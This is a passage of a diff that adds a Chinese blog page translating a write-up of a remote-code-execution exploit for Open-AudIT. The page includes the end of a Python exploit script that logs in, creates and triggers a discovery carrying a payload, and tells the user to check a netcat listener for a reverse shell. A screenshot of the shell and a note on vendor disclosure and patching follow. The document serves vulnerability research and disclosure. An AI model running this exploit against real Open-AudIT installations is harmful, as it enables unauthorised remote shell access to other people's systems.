class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_serial_type]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_sysname]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_sysname_serial]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_uuid]"</span>:<span class="string">""</span></span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    print(<span class="string">"[+] Creating discovery .."</span>)</span><br><span class="line">    req = request.post(post_discovery_path, data=request_data, headers=headers, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">    disocvery_url = url + req.headers[<span class="string">'Location'</span>] + <span class="string">"/execute"</span></span><br><span class="line">    print(<span class="string">"[+] Triggering payload .."</span>)</span><br><span class="line">    print(<span class="string">"[+] Check your nc ;)"</span>)</span><br><span class="line">    request.get(disocvery_url)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    login_info = &#123;</span><br><span class="line">    <span class="string">"redirect_url"</span>: <span class="string">"/en/omk/open-audit"</span>,</span><br><span class="line">    <span class="string">"username"</span>: username,</span><br><span class="line">    <span class="string">"password"</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    login_request = request.post(url+<span class="string">"/en/omk/open-audit/login"</span>, login_info)</span><br><span class="line">    login_text = login_request.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"There was an error authenticating"</span> <span class="keyword">in</span> login_text:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> login():</span><br><span class="line">    print(<span class="string">"[+] LoggedIn Successfully"</span>)</span><br><span class="line">    inject_payload()</span><br><span class="line">    start_discovery()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"[-] Cannot login!"</span>)</span><br></pre></td></tr></table></figure>
+<p>运行exploit脚本之后，我们可以得到shell：</p>
+<p><img src="/2020/05/26/translate02/openAudIT.png" alt=""></p>
+<blockquote>
+<p>请注意在windows版本中也可以实现漏洞利用。</p>
+</blockquote>
+<h2 id="漏洞披露"><a href="#漏洞披露" class="headerlink" title="漏洞披露"></a>漏洞披露</h2><p>已经向Opmantek团队发送了该漏洞的详细信息和完整的POC，他们修复了该漏洞并为其发布了补丁，您可以在5月底之前获得新版本。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/看雪翻译小组/" rel="tag"># 看雪翻译小组</a>
+          
+            <a href="/tags/WebAssembly/" rel="tag"># WebAssembly</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/13/GrAALF工具安装/" rel="next" title="GrAALF工具安装">
+                <i class="fa fa-chevron-left"></i> GrAALF工具安装
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">wangxy</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">30</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">23</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Open-AudIT-概述"><span class="nav-number">1.</span> <span class="nav-text">Open-AudIT 概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于exploit"><span class="nav-number">2.</span> <span class="nav-text">关于exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload编写"><span class="nav-number">3.</span> <span class="nav-text">payload编写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编写exploit"><span class="nav-number">4.</span> <span class="nav-text">编写exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞披露"><span class="nav-number">5.</span> <span class="nav-text">漏洞披露</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-wangxy"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wangxy</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
